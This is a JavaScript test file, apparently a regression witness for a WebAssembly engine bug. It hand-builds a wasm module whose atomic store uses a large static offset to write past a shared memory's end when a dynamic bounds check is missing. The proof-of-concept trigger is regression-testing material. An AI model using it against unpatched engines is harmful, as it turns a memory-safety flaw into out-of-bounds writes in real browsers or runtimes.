// Witness for a wasm memory out-of-bounds in the dynamic bounds check for
// atomic accesses on shared memory.
//
// A shared memory is created with a small initial size (1 page) but a large
// maximum (1000 pages). A wasm function performs `i32.atomic.store` with a
// large *static* offset (0x100000 = 16 pages) that is within `max_memory_size`
// but far beyond the current memory size. Atomic accesses use explicit bounds
// checks (no trap handler). On a correct build the dynamic end-offset-vs-size
// check traps (caught below). On the vulnerable build that check is elided, the
// effective-size subtraction underflows, and the store writes ~16 pages past
// the end of the backing store into the reserved (PROT_NONE) guard region,
// producing a crash / AddressSanitizer report.

function leb(n) {
  const out = [];
  do {
    let b = n & 0x7f;
    n >>>= 7;
    if (n !== 0) b |= 0x80;
    out.push(b);
  } while (n !== 0);
  return out;
}

const bytes = [
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // magic + version

  // Type section: one type () -> ()
  0x01, 0x04, 0x01, 0x60, 0x00, 0x00,

  // Function section: one function, type 0
  0x03, 0x02, 0x01, 0x00,

  // Memory section: 1 shared memory, min=1, max=1000 (flags 0x03 = has-max|shared)
  0x05, 0x05, 0x01, 0x03, 0x01, 0xe8, 0x07,

  // Export section: export function "f" (index 0)
  0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00,

  // Code section: one body
  0x0a, 0x0e, 0x01,
  0x0c,             // body size
  0x00,             // 0 locals
  0x41, 0x00,       // i32.const 0            (address/index)
  0x41, 0x01,       // i32.const 1            (value)
  0xfe, 0x17, 0x02, 0x80, 0x80, 0x40, // i32.atomic.store align=2 offset=0x100000
  0x0b,             // end
];

const module = new WebAssembly.Module(new Uint8Array(bytes));
const instance = new WebAssembly.Instance(module);

try {
  instance.exports.f();
  print("no trap (unexpected on a correct build)");
} catch (e) {
  // On a correct build this is a WebAssembly memory-out-of-bounds trap.
  print("trapped cleanly: " + e);
}
